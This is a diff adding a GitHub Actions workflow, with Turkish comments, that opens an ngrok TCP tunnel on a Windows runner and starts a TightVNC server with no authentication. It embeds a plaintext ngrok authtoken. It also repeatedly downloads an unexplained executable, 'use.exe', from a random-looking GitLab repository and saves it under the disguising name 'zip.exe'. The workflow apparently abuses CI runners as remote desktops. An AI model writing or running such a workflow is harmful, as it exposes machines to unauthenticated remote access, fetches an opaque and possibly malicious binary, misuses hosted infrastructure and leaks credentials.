@@ -1,0 +1,41 @@
+name: Start VNC Server with Ngrok
+
+on:
+  workflow_dispatch:
+
+jobs:
+  vnc_ngrok:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Install ngrok via Chocolatey
+        run: |
+          choco install ngrok -y
+          ngrok authtoken 2dui2XTrzirImJjBXxEVezW7Sjx_7jBriocpRkg4WvDF83Zne
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v AllowTightVNCLoopback /t REG_DWORD /d 1 /f
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v AllowAllLoopbackConnections /t REG_DWORD /d 1 /f
+
+      - name: Start ngrok tunnel for VNC
+        run: |
+          Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 5901" -NoNewWindow -PassThru
+          Start-Sleep -s 10  # Ngrok'un başlaması için biraz bekleme süresi
+
+      - name: Setuo VNC server
+        run: |
+          # VNC server'ı burada başlatın (örneğin TightVNC kullanılabilir)
+          # Örnek komut: vncserver :1 -geometry 1920x1080 -depth 24
+          # Gerekli kurulumları yapmak için önce choco install komutuyla gerekli paketleri yükleyin
+          choco install -y tightvnc
+
+      - name: Start VNC
+        run: |
+            vncserver :1 -geometry 1920x1080 -depth 24 -SecurityTypes None
+            cmd /c sleep 240 
+            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+            sleep 240
+            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+            sleep 240
+        
